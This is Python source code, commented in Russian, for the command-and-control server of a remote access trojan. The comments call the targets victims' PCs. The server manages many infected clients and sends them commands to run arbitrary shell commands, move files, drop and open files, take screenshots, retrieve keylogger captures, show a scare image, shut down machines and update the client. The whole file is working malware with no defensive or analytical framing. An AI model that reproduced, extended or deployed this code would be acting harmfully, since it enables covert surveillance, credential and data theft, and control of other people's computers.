import socket, json, base64, time
import threading
import asyncio
from time import sleep

import logging
logger = logging.getLogger('logger')

logger.setLevel(logging.DEBUG)
handler = logging.FileHandler("server_logs", "a")
handler.setFormatter(logging.Formatter(fmt='[%(asctime)s: %(levelname)s] %(message)s'))
logger.addHandler(handler)
logger.propagate = False


class Notificator:
    """Класс, который отвечает за уведомления на внешнем интерфейсе. Нужно наследоваться от этого класса"""
    def __init__(self) -> None:
        print("NOTIFICATOR!!!!!!!!!!")
    def make_notification(text: str, *args):
        """Принимает текст и дальше может выполнять любую логику.
           Важно, что может выполняться одновременно, поэтому должн о иметь механизмы защиты"""
        print(text)


# Список команд с описанием, в виде 2д массива
commands_en = [
    ["exit", "Exits the connection on both sides"],
    ["cd", "Changes the active directory with one arg"],
    ["download", "Downloads files from the client"],
    ["upload", "Uploads files from the server to the client"],
    ["message", "Shows a message box on the client users screen"],
    ["lock", "Puts the client user back to the login screen"],
    ["shutdown", "Shutsdown the client PC"],
    ["restart", "Restarts the client PC"],
    ["screen", "makes screenshot"],
    ["drop", "uploads file to client pc and opep it"],
    ["clires", "restarts client script"],
]

commands = [
    ["exit", "Закрывает соединение с клиентом"],
    ["cd", "меняет активную директорию при одном аргументе, без аргументов выводит активную"],
    ["download", "Скачивает файл с пк клиента"],
    ["upload", "Загружает файл с сервера на пк клиента"],
    ["message", "Выводит на клиенте сообщение"],
    ["lock", "Блокирует пользователя на клиенте, при этом ратник продолжет работать"],
    ["shutdown", "выключает пк клиента"],
    ["restart", "перезагружает пк клиента"],
    ["screen", "делает скриншот"],
    ["screamer", "показывает скример"],
    ["drop", "отправляет файл из телеграма и открывает его на клиенте"],
    ["clires", "перезапускает скрипт клиента"],
    ["keylogger", "возвращает клавиши собранные кейлогером"],
    ["ping", "показывает задержку в подключении с клиентом"],
    ["ls", "показывает содержимое папки"],
    ["отправить новый файл клиента с комментарием update", "обновляет приложение клиент на пк жертвы"]
]

# выводит список доступных команд
def help_command():
    """Выводит список доступных команд с описанием"""
    result = "\nКоманды: \n"
    # Добавление описания каждой команды
    for command in commands:
        result = result + "\n" + f"{command[0]} - {command[1]}"
    result = result + "\n" + "Anything - will run a command on the users PC like command prompt\n"
    return result

class ManyServers:
    """Класс Сервера, который позволяет оперировать с множеством подключений к клиентам."""
# public:
    def __init__(self, notificator: Notificator =None):
        # import config
        # server = Server(config.SERVER_IP, config.SERVER_PORT)
        # список тегов активных серверов
        self.__servers_count: list[int] = []
        self.__servers_ips = {}
        # менеджер для доставки уведомлений во внешний интерфейс
        self.notificator: Notificator = notificator if notificator is not None else Notificator()
        # мониторинг новых запросов на подключение со стороны клиентов
        threading.Thread(target=self.__connection_monitor, daemon=True).start()
        # проверка состояния клиентов
        threading.Thread(target=(self.__connection_checker), daemon=True).start()
    
    def view_all_servers(self):
        """Возвращает список активных подключений"""
        s = ""
        for i in self.__servers_ips.keys():
            print(self.__servers_count)
            s = s + str(i) + ". " + str(self.__servers_ips[i][0]) + "\n"
        if s == "":
            s = "нет подключенных клиентов в данный момент"
        return s
    
    async def make_command_to_server(self, command, time_limit=20):
        # останавливает поток(и) с выполнение команды
        stop_flag = [False]
        res = "Выполнение не уложилось во временной лимит, однако оно продолжится на клиенте"
        # установление временного лимита, елси он указан в команде
        if "time_limit" in command:
            time_limit = int(command.split("time_limit")[1])
        def make_command_to_server():
            """Создание запроса к клиенту(ам) по тегу. Если тег = all, отправляет запрос всем клиентам\n
                many[client_tag_1, client_tag_2, ..., client_tag_n], отправляет запрос нескольким клиентам"""
            nonlocal res
            nonlocal self
            nonlocal command
            nonlocal stop_flag
            logger.debug(f"make_command_to_server, command={command}")
            # @todo many tags
            # @todo async execution
            # извлечение тега из сообщения
            try:
                tag = command.split()[0]
            # проверка наличия тега клиента
            except IndexError:
                res = "Укажите тег!"
                return
            # проверка наличия команды для клиента
            if len(command.split()) == 1:
                res = "Укажите команду!"
                return
            # обработка сценария с тегом all
            if tag == "all":
                res = [command[1]]
                # проход по всем подключенным клиентам
                for i in self.__servers_ips.values():
                    i: Server = i[1]
                    # проверка занятости клиента другим запросом
                    if i.in_process:
                        continue
                    # добавляет в пул возрата результат выпослнения на одном из клиентов
                    res.append(i.step(command.split()[1:], stop_flag=stop_flag))
                print("возврат из all", res)
                res = res
                return
            # обпаботка сценария с тегом many, который вызывает команду на нескольких клиетах 
            elif tag == "many":
                pass
            else:
                logger.debug(f"make_command_to_server one client, command={command}")
                # проверка корректности тега
                try:
                    tag = int(tag)
                except ValueError:
                    res = f"некорректный тег: {tag}"
                    return
                # проверка наличия подключения с полученным тегом
                if self.__servers_ips.get(tag, "no") == "no":
                    res = f"нет подключения с тегом: {tag}"
                    return
                # проверка занятости клиента другим запросом
                elif self.__servers_ips[tag][1].in_process:
                    res = f"{tag} клиент занят выполнением другой задачи"
                    return
                # выполнение запроса определенным клиентом
                else:
                    command = command.split()[1:]
                    res = self.__servers_ips[tag][1].step(command, stop_flag=stop_flag)
                    if res == "Клиент отключен -_-":
                        self.__servers_ips.pop(tag)
                        self.__servers_count.pop(int(tag))
                        res = "соеденение закрыто"
                        return
        threading.Thread(target=make_command_to_server).start()
        # ожидание работы
        for i in range(time_limit):
            await asyncio.sleep(1)
            if res != "Выполнение не уложилось во временной лимит, однако оно продолжится на клиенте":
                break
        stop_flag[0] = True
        if res == "Выполнение не уложилось во временной лимит, однако оно продолжится на клиенте":
            await asyncio.sleep(2)
        return res

# private:

    def __connection_checker(self):
        """Проверка подключенных клиентов"""
        while True:
            res = self.make_command_to_server("all ping")
            sleep(5)

    def __add_server_to_count(self):
        i = 0
        while True:
            if i not in self.__servers_count:
                self.__servers_count.append(i)
                return i
            i += 1
    
    def __connection_monitor(self):
        """Мониторинг новых подключений, если появляется запрос от нового клиента, принимает его"""
        import config
        # принятие запроса на подключение от клиента
        server = Server(config.SERVER_IP, config.SERVER_PORT)
        # добавление нового подключения в список всех подключений
        self.__servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
        # уведомление о подключении нового клиента во внешнюю среду
        text = "подключен новый клиент" + str(server.tag)
        self.notificator.make_notification(text)
        # повторный вызов для бесконечного мониторинга
        self.__connection_monitor()
    


class Server:
#public:
    def __init__(self, ip, port):
        self.in_process = False
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print("[+] Ожидание подключения")
        self.connection, address = server.accept()
        self.tag = address[0]
        print("[+] Подключен клиент с адресом: " + str(address))
        # helpCommand()
        
    def step(self, command, stop_flag=[False]):
        # command = command.split(" ", 1)
        self.in_process = True
        try:
            if command[0] in ["upload", "drop", "update_client"]:
                fileContent = self.__readFile(command[1]).decode()
                command.append(fileContent)
            elif command[0] == "ping":
                start_ping_time: float = time.time()
            elif command[0] == "ls":
                command[0] = "dir"
            result = self.__executeRemotely(command, stop_flag=stop_flag)
            if command[0] == "download" and "[-] Error" not in result:
                result = self.__writeFile(command[1], result)
            elif command[0] == "screenshot" and "[-] Error" not in result:
                result = self.__screenshot(result)
            elif command[0] == "ratHelp":
                result = help_command()
            elif command[0] == "ping":
                self.in_process = False
                return time.time() - start_ping_time
            elif command[0] == "clires":
                self.in_process = False
                return "Клиент отключен -_-"
        except Exception as err:
            logger.debug(err)
            result = "ошибка выполнения команды, проверьте синтаксис"
        self.in_process = False
        return result

# private:
    # выполнение команды в консоли клиента
    def __executeRemotely(self, command, stop_flag=[False]):
        """выполнение команды в консоли клиента"""
        self.__send_json(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.__receive_json(stop_flag=stop_flag)

    # чтение файла
    def __readFile(self, path):
        """чтение файла"""
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # создание файла
    def __writeFile(self, path, content):
        """создание файла"""
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download complete"
    
    # делает скриншот на клиенте
    def __screenshot(self, content):
        """делает скриншот на клиенте"""
        with open("screen.png", "wb") as file:
            file.write(base64.b64decode(content))
        return ("screen",)
    
    # Отправка json-данных клиенту
    def __send_json(self, data):
        """Отправка json-данных клиенту"""
        # Обрабатываем бинарные данные
        try: json_data = json.dumps(data.decode('utf-8'))
        except: json_data = json.dumps(data)
        
        # В случае если клиент разорвал соединение но сервер отправляет команду
        try:
            self.connection.send(json_data.encode('utf-8')) 
        except ConnectionResetError:
            # Отключаемся от текущей сессии
            self.connection = None


    # Получаем json данные от клиента
    def __receive_json(self, stop_flag=[False]):
        """Получение json данные от клиента"""
        json_data = ''
        while True:
            if stop_flag[0]:
                return "Операция прервана по времени"
            try:
                if self.connection != None:
                    json_data += self.connection.recv(1024).decode('utf-8')
                    return json.loads(json_data)
                # действие при отсутствующем подключении к клиенту
                else: 
                    return "Клиент отключен -_-"
            except ValueError:
                pass
